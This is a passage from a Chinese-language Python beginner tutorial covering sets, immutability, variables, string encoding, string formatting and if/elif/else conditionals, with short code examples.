class="line">s = set([1, 1, 2, 2, 3, 3])</span><br><span class="line">print(s) # &#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>添加</strong></li></ul><p>通过 <code>add(key)</code> 方法可以添加元素到 set 中，可以重复添加，但不会有效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s.add(4)</span><br><span class="line">print(s) # &#123;1, 2, 3, 4&#125;</span><br><span class="line">s.add(4)</span><br><span class="line">print(s) # &#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>删除</strong></li></ul><p>通过 <code>remove(key)</code> 方法可以删除元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.remove(4)</span><br><span class="line">print(s) # &#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>并集、交集操作</strong></li></ul><p>set 可以看成数学意义上的无序和无重复元素的集合，因此，两个 set 可以做数学意义上的交集、并集等操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = set([1, 2, 3])</span><br><span class="line">s2 = set([2, 3, 4])</span><br><span class="line">print(s1 &amp; s2) # &#123;2, 3&#125;</span><br><span class="line">print((s1  s2)) # &#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-2-再议不可变对象"><a href="#1-3-2-再议不可变对象" class="headerlink" title="1.3.2 再议不可变对象"></a>1.3.2 再议不可变对象</h3><p>上面我们讲了，str 是不变对象，而 list 是可变对象。</p><p>对于可变对象，比如 list，对 list 进行操作，list 内部的内容是会变化的，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [&#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;]</span><br><span class="line">a.sort()</span><br><span class="line">print(a) # [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>而对于不可变对象，比如 str，对 str 进行操作呢：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#x27;abc&#x27;</span><br><span class="line">print(a.replace(&#x27;a&#x27;, &#x27;A&#x27;)) # &#x27;Abc&#x27;</span><br><span class="line">print(a) # &#x27;abc&#x27;</span><br></pre></td></tr></table></figure><p>虽然字符串有个 <code>replace()</code> 方法，也确实变出了 <code>&#39;Abc&#39;</code>，但变量 <code>a</code> 最后仍是 <code>&#39;abc&#39;</code>，应该怎么理解呢？</p><p>我们先把代码改成下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#x27;abc&#x27;</span><br><span class="line">b = a.replace(&#x27;a&#x27;, &#x27;A&#x27;)</span><br><span class="line">print(b) # &#x27;Abc&#x27;</span><br><span class="line">print(a) # &#x27;abc&#x27;</span><br></pre></td></tr></table></figure><p>要始终牢记的是，<code>a</code> 是变量，而 <code>&#39;abc&#39;</code> 才是字符串对象！有些时候，我们经常说，对象 <code>a</code> 的内容是 <code>&#39;abc&#39;</code>，但其实是指，<code>a</code> 本身是一个变量，它指向的对象的内容才是 <code>&#39;abc&#39;</code>：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611175124.png" alt="image-20200611175123150" title="image-20200611175123150"></p><p>当我们调用 <code>a.replace(&#39;a&#39;, &#39;A&#39;)</code> 时，实际上调用方法 <code>replace</code> 是作用在字符串对象 <code>&#39;abc&#39;</code> 上的，而这个方法虽然名字叫 <code>replace</code>，但却没有改变字符串 <code>&#39;abc&#39;</code> 的内容。相反，<code>replace</code> 方法创建了一个新字符串 <code>&#39;Abc&#39;</code> 并返回，如果我们用变量 <code>b</code> 指向该新字符串，就容易理解了，变量 <code>a</code> 仍指向原有的字符串 <code>&#39;abc&#39;</code>，但变量 <code>b</code> 却指向新字符串 <code>&#39;Abc&#39;</code> 了：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611175232.png" alt="image-20200611175231653" title="image-20200611175231653"></p><p>所以，对于不变对象来说，调用对象自身的任意方法，也不会改变该对象自身的内容。相反，这些方法会创建新的对象并返回，这样，就保证了不可变对象本身永远是不可变的。</p><p>!&gt; 小结</p><ul><li>使用 key - value 存储结构的 dict 在 Python 中非常有用，选择不可变对象作为 key 很重要，最常用的 key 是字符串。</li><li>tuple 虽然是不变对象，但试试把<code>(1, 2, 3)</code>和<code>(1, [2, 3])</code>放入 dict 或 set 中，就会有新发现。</li></ul><h3 id="1-3-3-变量与常量"><a href="#1-3-3-变量与常量" class="headerlink" title="1.3.3 变量与常量"></a>1.3.3 变量与常量</h3><h4 id="①-变量"><a href="#①-变量" class="headerlink" title="① 变量"></a>① 变量</h4><p><strong>变量是用来保存和表示数据的占位符号。</strong>变量采用标识符（名字）来表示，关联标识符的过程叫命名。比如实例 1：温度转换中的 TempStr 就是变量名字。</p><p><strong>命名规则</strong>：大小写字母、数字、下划线<code>_</code>和汉字等字符及组合，且不能用数字开头</p><p>如：TempStr，Python_Great，这是门Python好课</p><p>? 注意点：大小写敏感、首字符不能是数字、不与保留字相同。</p><p>⛳️ 拓展：<code>保留字</code></p><p>保留字：被编程语言内部定义并保留使用的标识符。</p><ul><li>Python 语言有 33 个保留字（也叫<code>关键字</code>），比如：if、elif、else、in</li><li>保留字是编程语言的基本单词，大小写敏感，比如：if 是保留字，If 是变量</li></ul><p><strong>保留字</strong>看下表：</p><p><img src="https://cos.gjcloak.xyz/pigo/202207192005834.png?imageMogr2/format/webp/interlace/1/quality/80" alt="保留字" title="保留字"></p><p>在 Python 中，等号 <code>=</code> 是赋值符号，可以把任意数据类型赋值给变量，同一个变量可以反复赋值，而且可以是不同类型的变量，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = 123 # a是整数</span><br><span class="line">print(a)</span><br><span class="line">a = &#x27;ABC&#x27; # a变为字符串</span><br><span class="line">print(a)</span><br><span class="line">a = True # a是一个布尔值True</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>? 这种变量本身类型不固定的语言称之为 **动态语言 (Python、……)**，与之对应的是 <strong>静态语言（Java、C++、……）</strong>。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。</p><p>例如 Java 是静态语言，赋值语句如下（&#x2F;&#x2F; 表示注释）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a = 123; // a是整数类型变量</span><br><span class="line">a = &quot;ABC&quot;; // 错误：不能把字符串赋给整型变量</span><br></pre></td></tr></table></figure><p>和静态语言相比，动态语言更灵活，就是这个原因。</p><p>请不要把赋值语句的等号等同于数学的等号。比如下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = 10</span><br><span class="line">x = x + 2</span><br></pre></td></tr></table></figure><p>如果从数学上理解 <code>x = x + 2</code> 那无论如何是不成立的，在程序中，赋值语句先计算右侧的表达式 <code>x + 2</code>，得到结果 <code>12</code>，再赋给变量 <code>x</code>。由于 <code>x</code> 之前的值是 <code>10</code>，重新赋值后，<code>x</code> 的值变成 <code>12</code>。</p><p>最后，理解变量在计算机内存中的表示也非常重要。当我们写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = &#x27;ABC&#x27;</span><br></pre></td></tr></table></figure><p>时，Python 解释器干了两件事情：</p><ul><li>在内存中创建了一个 <code>&#39;ABC&#39;</code> 的字符串；</li><li>在内存中创建了一个名为 <code>a</code> 的变量，并把它指向 <code>&#39;ABC&#39;</code>。</li></ul><p>? 也可以把一个变量 <code>a</code> 赋值给另一个变量 <code>b</code>，这个操作实际上是把变量 <code>b</code> 指向变量 <code>a</code> 所指向的数据，例如下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#x27;ABC&#x27;</span><br><span class="line">b = a</span><br><span class="line">a = &#x27;XYZ&#x27;</span><br><span class="line">print(b) # 输出 ABC</span><br></pre></td></tr></table></figure><p>最后一行打印出变量 <code>b</code> 的内容到底是<code>&#39;ABC&#39;</code>呢还是<code>&#39;XYZ&#39;</code>？如果从数学意义上理解，就会错误地得出 <code>b</code> 和 <code>a</code> 相同，也应该是<code>&#39;XYZ&#39;</code>，但实际上 <code>b</code> 的值是 <code>&#39;ABC&#39;</code>，让我们一行一行地执行代码，就可以看到到底发生了什么事：</p><ul><li><p>执行<code>a = &#39;ABC&#39;</code>，解释器创建了字符串<code>&#39;ABC&#39;</code>和变量<code>a</code>，并把<code>a</code>指向<code>&#39;ABC&#39;</code>：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611180919.png" alt="img" title="img"></p></li><li><p>执行<code>b = a</code>，解释器创建了变量<code>b</code>，并把<code>b</code>指向<code>a</code>指向的字符串<code>&#39;ABC&#39;</code>：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611180923.png" alt="img" title="img"></p></li><li><p>执行<code>a = &#39;XYZ&#39;</code>，解释器创建了字符串’XYZ’，并把<code>a</code>的指向改为<code>&#39;XYZ&#39;</code>，但<code>b</code>并没有更改：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611180926.png" alt="img" title="img"></p></li><li><p>所以，最后打印变量<code>b</code>的结果自然是<code>&#39;ABC&#39;</code>了。</p></li></ul><h4 id="②-常量"><a href="#②-常量" class="headerlink" title="② 常量"></a>② 常量</h4><p>所谓常量就是不能变的变量，比如常用的数学常数 π 就是一个常量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PI = 3.14159265359</span><br></pre></td></tr></table></figure><p>在 Python 中，通常用<code>全部大写</code>的变量名表示常量。</p><p>但事实上 <code>PI</code> 仍然是一个变量，Python 根本没有任何机制保证 <code>PI</code> 不会被改变，所以，用全部大写的变量名表示常量只是一个习惯上的用法，如果你一定要改变变量 <code>PI</code> 的值，也没人能拦住你。</p><h3 id="1-3-4-字符串和编码"><a href="#1-3-4-字符串和编码" class="headerlink" title="1.3.4 字符串和编码"></a>1.3.4 字符串和编码</h3><h4 id="①-字符串编码问题"><a href="#①-字符串编码问题" class="headerlink" title="① 字符串编码问题"></a>① 字符串编码问题</h4><p>我们已经讲过了，字符串也是一种数据类型，但是，字符串比较特殊的是还有一个编码问题。</p><p>因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理。最早的计算机在设计时采用 8 个比特（bit）作为一个字节（byte），所以，一个字节能表示的最大的整数就是 255（二进制 11111111 &#x3D; 十进制 255），如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是<code>65535</code>，4 个字节可以表示的最大整数是<code>4294967295</code>。</p><p>由于计算机是美国人发明的，因此，最早只有 127 个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为<code>ASCII</code>编码，比如大写字母<code>A</code>的编码是<code>65</code>，小写字母<code>z</code>的编码是<code>122</code>。</p><p>但是要处理中文显然一个字节是不够的，至少需要两个字节，而且还不能和 ASCII 编码冲突，所以，中国制定了<code>GB2312</code>编码，用来把中文编进去。</p><p>你可以想得到的是，全世界有上百种语言，日本把日文编到<code>Shift_JIS</code>里，韩国把韩文编到<code>Euc-kr</code>里，各国有各国的标准，就会不可避免地出现冲突，结果就是，在多语言混合的文本中，显示出来会有乱码。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200623172826.png" alt="image-20200623172824974" title="image-20200623172824974"></p><p>因此，Unicode 应运而生。<strong>Unicode 把所有语言都统一到一套编码里，这样就不会再有乱码问题了。</strong></p><p>Unicode 标准也在不断发展，但最常用的是用两个字节表示一个字符（如果要用到非常偏僻的字符，就需要 4 个字节）。现代操作系统和大多数编程语言都直接支持 Unicode。</p><p>? 现在，捋一捋 ASCII 编码和 Unicode 编码的区别：<strong>ASCII 编码是 1 个字节，而 Unicode 编码通常是 2 个字节。</strong></p><ul><li>字母<code>A</code>用 ASCII 编码是十进制的<code>65</code>，二进制的<code>01000001</code>；</li><li>字符<code>0</code>用 ASCII 编码是十进制的<code>48</code>，二进制的<code>00110000</code>，注意字符<code>&#39;0&#39;</code>和整数<code>0</code>是不同的；</li><li>汉字<code>中</code>已经超出了 ASCII 编码的范围，用 Unicode 编码是十进制的<code>20013</code>，二进制的<code>01001110 00101101</code>。</li></ul><p>你可以猜测，如果把 ASCII 编码的<code>A</code>用 Unicode 编码，只需要在前面补 0 就可以，因此，<code>A</code>的 Unicode 编码是<code>00000000 01000001</code>。</p><p>新的问题又出现了：如果统一成 Unicode 编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，用 Unicode 编码比 ASCII 编码需要<code>多一倍</code>的<code>存储空间</code>，在存储和传输上就十分不划算。</p><p>所以，本着节约的精神，又出现了把 Unicode 编码转化为 “可变长编码” 的<code>UTF-8</code>编码。UTF-8 编码把一个 Unicode 字符根据不同的数字大小编码成 1-6 个字节，常用的英文字母被编码成 1 个字节，汉字通常是 3 个字节，只有很生僻的字符才会被编码成 4-6 个字节。如果你要传输的文本包含大量英文字符，用 UTF-8 编码就能节省空间：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200623173835.png" alt="image-20200623173834408" title="image-20200623173834408"></p><p>从上面的表格还可以发现，UTF-8 编码有一个额外的好处，就是 ASCII 编码实际上可以被看成是 UTF-8 编码的一部分，所以，大量只支持 ASCII 编码的历史遗留软件可以在 UTF-8 编码下继续工作。</p><p>搞清楚了 ASCII、Unicode 和 UTF-8 的关系，我们就可以总结一下现在计算机系统通用的字符编码工作方式：</p><p>? <strong>在计算机内存中，统一使用 Unicode 编码，当需要保存到硬盘或者需要传输的时候，就转换为 UTF-8 编码。</strong></p><p>用记事本编辑的时候，从文件读取的 UTF-8 字符被转换为 Unicode 字符到内存里，编辑完成后，保存的时候再把 Unicode 转换为 UTF-8 保存到文件：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200623174151.png" alt="image-20200623174150679" title="image-20200623174150679"></p><p>浏览网页的时候，服务器会把动态生成的 Unicode 内容转换为 UTF-8 再传输到浏览器：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200623174255.png" alt="image-20200623174254190" title="image-20200623174254190"></p><p>所以你看到很多网页的源码上会有类似 <code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code> 的信息，表示该网页正是用的 UTF-8 编码。</p><h4 id="②-字符串详解"><a href="#②-字符串详解" class="headerlink" title="② 字符串详解"></a>② 字符串详解</h4><p>搞清楚了令人头疼的字符编码问题后，我们再来研究 Python 的字符串。</p><p>在最新的 Python 3 版本中，字符串是以 Unicode 编码的，也就是说，<strong>Python 的字符串支持多语言</strong>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;包含中文的str&#x27;)</span><br><span class="line"># 输出：包含中文的str</span><br></pre></td></tr></table></figure><p>对于单个字符的编码，Python 提供了<code>ord()</code>函数获取字符的整数表示，<code>chr()</code>函数把编码转换为对应的字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ord(&#x27;A&#x27;) # 65</span><br><span class="line">ord(&#x27;中&#x27;) # 20013</span><br><span class="line">chr(66) # &#x27;B&#x27;</span><br><span class="line">chr(25991) # &#x27;文&#x27;</span><br></pre></td></tr></table></figure><p>如果知道字符的整数编码，还可以用十六进制这么写<code>str</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;\u4e2d\u6587&#x27;) # 中文</span><br></pre></td></tr></table></figure><p>两种写法完全是等价的。</p><p>由于 Python 的字符串类型是<code>str</code>，在内存中以 Unicode 表示，一个字符对应若干个字节。如果要在网络上传输，或者保存到磁盘上，就需要把<code>str</code>变为以字节为单位的<code>bytes</code>。</p><p>Python 对<code>bytes</code>类型的数据用带<code>b</code>前缀的单引号或双引号表示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = b&#x27;ABC&#x27;</span><br></pre></td></tr></table></figure><p>要注意区分<code>&#39;ABC&#39;</code>和<code>b&#39;ABC&#39;</code>，前者是<code>str</code>，后者虽然内容显示得和前者一样，但<code>bytes</code>的每个字符都只占用一个字节。</p><p>以 Unicode 表示的<code>str</code>通过<code>encode()</code>方法可以编码为指定的<code>bytes</code>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;ABC&#x27;.encode(&#x27;ascii&#x27;)) # b&#x27;ABC&#x27;</span><br><span class="line">print(&#x27;中文&#x27;.encode(&#x27;utf-8&#x27;)) # b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span><br></pre></td></tr></table></figure><p>纯英文的<code>str</code>可以用<code>ASCII</code>编码为<code>bytes</code>，内容是一样的，含有中文的<code>str</code>可以用<code>UTF-8</code>编码为<code>bytes</code>。<strong>含有中文的<code>str</code>无法用<code>ASCII</code>编码</strong>，因为中文编码的范围超过了<code>ASCII</code>编码的范围，Python 会报错。</p><p>反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是<code>bytes</code>。要把<code>bytes</code>变为<code>str</code>，就需要用<code>decode()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(b&#x27;ABC&#x27;.decode(&#x27;ascii&#x27;))</span><br><span class="line">print(b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure><p>如果<code>bytes</code>中包含无法解码的字节，<code>decode()</code>方法会报错：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200623175619.png" alt="image-20200623175618702" title="image-20200623175618702"></p><p>如果<code>bytes</code>中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200623175707.png" alt="image-20200623175706636" title="image-20200623175706636"></p><p>要计算<code>str</code>包含多少个字符，可以用<code>len()</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(len(&#x27;ABC&#x27;)) # 3</span><br><span class="line">print(len(&#x27;中文&#x27;)) # 2</span><br></pre></td></tr></table></figure><p><code>len()</code>函数计算的是<code>str</code>的字符数，如果换成<code>bytes</code>，<code>len()</code>函数就计算字节数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(len(b&#x27;ABC&#x27;)) # 3</span><br><span class="line">print(len(b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;)) # 6</span><br><span class="line">print(len(&#x27;中文&#x27;.encode(&#x27;utf-8&#x27;))) # 6</span><br></pre></td></tr></table></figure><p>可见，1 个中文字符经过 UTF-8 编码后通常会占用 3 个字节，而 1 个英文字符只占用 1 个字节。</p><blockquote><p>? 在操作字符串时，我们经常遇到<code>str</code>和<code>bytes</code>的互相转换。为了避免乱码问题，应当始终坚持使用 UTF-8 编码对<code>str</code>和<code>bytes</code>进行转换。</p><p>由于 Python 源代码也是一个文本文件，所以，当你的源代码中包含中文的时候，<strong>在保存源代码时，就需要务必指定保存为 UTF-8 编码</strong>。当 Python 解释器读取源代码时，为了让它按 UTF-8 编码读取，我们通常在文件开头写上这两行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure><p>第一行注释是为了告诉 Linux&#x2F;OS X 系统，这是一个 Python 可执行程序，Windows 系统会忽略这个注释；</p><p>第二行注释是为了告诉 Python 解释器，按照 UTF-8 编码读取源代码，否则，你在源代码中写的中文输出可能会有乱码。</p></blockquote><h4 id="③-格式化"><a href="#③-格式化" class="headerlink" title="③ 格式化"></a>③ 格式化</h4><p>最后一个常见的问题是如何<code>输出格式化的字符串</code>。我们经常会输出类似<code>&#39;亲爱的 xxx 你好！你 xx 月的话费是 xx，余额是 xx&#39;</code>之类的字符串，而 xxx 的内容都是根据变量变化的，所以，需要一种简便的格式化字符串的方式。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200623180526.png" alt="image-20200623180524717" title="image-20200623180524717"></p><p>在 Python 中，采用的格式化方式和 C 语言是一致的，用<code>%</code>实现，举例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;Hello, %s&#x27; % &#x27;world&#x27;) # Hello, world</span><br><span class="line">print(&#x27;Hello, %s, you have %d money&#x27; %(&#x27;WuGenQiang&#x27;,100))</span><br><span class="line"># Hello, WuGenQiang, you have 100 money</span><br></pre></td></tr></table></figure><p>你可能猜到了，<code>%</code>运算符就是用来格式化字符串的。在字符串内部，<code>%s</code>表示用字符串替换，<code>%d</code>表示用整数替换，有几个<code>%?</code>占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个<code>%?</code>，括号可以省略。</p><p>常见的占位符有：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200623181029.png" alt="image-20200623181028546" title="image-20200623181028546"></p><p>其中，格式化整数和浮点数还可以指定是否补 0 和整数与小数的位数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;%2d-%02d&#x27; % (3, 1)) #  3-01</span><br><span class="line">print(&#x27;%.2f&#x27; % 3.1415926) # 3.14</span><br></pre></td></tr></table></figure><p>如果你不太确定应该用什么，<code>%s</code>永远起作用，它会把任何数据类型转换为字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;Age: %s Gender: %s&#x27; % (25, True))</span><br><span class="line"># 输出：Age: 25 Gender: True</span><br></pre></td></tr></table></figure><p>有些时候，字符串里面的<code>%</code>是一个普通字符怎么办？这个时候就需要转义，用<code>%%</code>来表示一个<code>%</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(‘growth rate: %d %%&#x27; % 7)</span><br><span class="line"># 输出：&#x27;growth rate: 7 %&#x27;</span><br></pre></td></tr></table></figure><h4 id="④-format"><a href="#④-format" class="headerlink" title="④ format()"></a>④ format()</h4><p>另一种格式化字符串的方法是使用字符串的<code>format()</code>方法，它会用传入的参数依次替换字符串内的占位符<code>&#123;0&#125;</code>、<code>&#123;1&#125;</code>……，不过这种方式写起来比 % 要麻烦得多：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;Hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&#x27;.format(&#x27;小明&#x27;, 17.125))</span><br><span class="line"># 输出：Hello, 小明, 成绩提升了 17.1%</span><br></pre></td></tr></table></figure><blockquote><p>✏️ 练习题：</p></blockquote><p>【题目】小明的成绩从去年的 72 分提升到了今年的 85 分，请计算小明成绩提升的百分点，并用字符串格式化显示出<code>&#39;xx.x%&#39;</code>，只保留小数点后 1 位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">score1 = 72</span><br><span class="line">score2 = 85</span><br><span class="line">r = (score2 - score1) * 100 / score1</span><br><span class="line">print(&#x27;%.1f %%&#x27; %r)</span><br></pre></td></tr></table></figure><h3 id="1-3-5-条件判断"><a href="#1-3-5-条件判断" class="headerlink" title="1.3.5 条件判断"></a>1.3.5 条件判断</h3><p>计算机之所以能做很多自动化的任务，因为它可以自己做<code>条件判断</code>。</p><p>比如，输入用户年龄，根据年龄打印不同的内容，在 Python 程序中，用<code>if</code>语句实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&#x27;your age is&#x27;, age)</span><br><span class="line">    print(&#x27;adult&#x27;)</span><br></pre></td></tr></table></figure><p>根据 Python 的缩进规则，如果<code>if</code>语句判断是<code>True</code>，就把缩进的两行 print 语句执行了，否则，什么也不做。</p><p>也可以给<code>if</code>添加一个<code>else</code>语句，意思是，如果<code>if</code>判断是<code>False</code>，不要执行<code>if</code>的内容，去把<code>else</code>执行了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 3</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&#x27;your age is&#x27;, age)</span><br><span class="line">    print(&#x27;adult&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;your age is&#x27;, age)</span><br><span class="line">    print(&#x27;teenager&#x27;)</span><br></pre></td></tr></table></figure><p>!&gt; 注意不要少写了冒号<code>:</code>。</p><p>当然上面的判断是很粗略的，完全可以用<code>elif</code>做更细致的判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 3</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&#x27;adult&#x27;)</span><br><span class="line">elif age &gt;= 6:</span><br><span class="line">    print(&#x27;teenager&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;kid&#x27;)</span><br></pre></td></tr></table></figure><p><code>elif</code>是<code>else if</code>的缩写，完全可以有多个<code>elif</code>，所以<code>if</code>语句的完整形式就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if &lt;条件判断1&gt;:</span><br><span class="line">    &lt;执行1&gt;</span><br><span class="line">elif &lt;条件判断2&gt;:</span><br><span class="line">    &lt;执行2&gt;</span><br><span class="line">elif &lt;条件判断3&gt;:</span><br><span class="line">    &lt;执行3&gt;</span><br><span class="line">else:</span><br><span class="line">    &lt;执行4&gt;</span><br></pre></td></tr></table></figure><p>⭐ <code>if</code>语句执行有个特点，它是从上往下判断，如果在某个判断上是<code>True</code>，把该判断对应的语句执行后，就忽略掉剩下的<code>elif</code>和<code>else</code>，所以，下面的程序打印的是<code>teenager</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">if age &gt;= 6:</span><br><span class="line">    print(&#x27;teenager&#x27;)</span><br><span class="line">elif age &gt;= 18:</span><br><span class="line">    print(&#x27;adult&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;kid&#x27;)</span><br></pre></td></tr></table></figure><p><code>if</code>判断条件还可以简写，比如写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if x:</span><br><span class="line">    print(&#x27;True&#x27;)</span><br></pre></td></tr></table></figure><p>只要<code>x</code>是非零数值、非空字符串、非空 list 等，就判断为<code>True</code>，否则为<code>False</code>。</p><blockquote><p>再议 input</p></blockquote><p>最后看一个有问题的条件判断。很多同学会用<code>input()</code>读取用户的输入，这样可以自己输入，程序运行得更有意思：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">birth = input(&#x27;birth: 